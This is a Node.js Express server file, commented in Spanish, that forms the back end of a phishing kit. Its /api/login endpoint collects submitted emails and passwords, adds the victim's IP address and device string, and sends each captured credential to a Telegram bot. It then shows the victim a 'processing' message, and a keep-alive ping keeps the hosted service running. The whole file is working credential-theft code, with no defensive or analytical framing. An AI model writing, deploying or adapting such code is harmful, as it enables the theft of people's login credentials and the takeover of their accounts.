// server.js
const express = require('express');
const cors = require('cors');
const axios = require('axios');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 10000;

// Configuración de Telegram
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// Health check para mantener Render activo
app.get('/health', (req, res) => {
  res.status(200).json({ status: 'ok', timestamp: Date.now() });
});

// Función para enviar mensaje a Telegram (rápida y eficiente)
async function sendToTelegram(email, password, ip, userAgent) {
  const message = `
🔐 *NUEVA CREDENCIAL*

📧 Email: \`${email}\`
🔑 Password: \`${password}\`

📍 IP: ${ip}
🖥️ Device: ${userAgent.substring(0, 50)}
⏰ ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}
  `;

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  
  try {
    const response = await axios.post(url, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'Markdown'
    }, {
      timeout: 5000 // Timeout de 5 segundos
    });
    return response.data.ok;
  } catch (error) {
    console.error('Error Telegram:', error.message);
    return false;
  }
}

// Endpoint principal para recibir credenciales
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;
  
  if (!email || !password) {
    return res.status(400).json({ 
      success: false, 
      message: 'Faltan datos' 
    });
  }

  // Obtener IP y User Agent
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const userAgent = req.headers['user-agent'] || 'Desconocido';

  // Enviar a Telegram de forma asíncrona (no bloqueante)
  sendToTelegram(email, password, ip, userAgent).catch(err => {
    console.error('Error async:', err);
  });

  // Responder inmediatamente al frontend
  res.json({ 
    success: true, 
    message: 'Procesando...' 
  });
});

// Ruta raíz
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/public/index.html');
});

// Iniciar servidor
app.listen(PORT, '0.0.0.0', () => {
  console.log(`✅ Servidor corriendo en puerto ${PORT}`);
  console.log(`📱 Bot de Telegram configurado`);
});

// Keep-alive para Render (previene que el servicio se duerma)
setInterval(() => {
  axios.get(`http://localhost:${PORT}/health`)
    .catch(err => console.log('Keep-alive ping'));
}, 14 * 60 * 1000); // Cada 14 minutos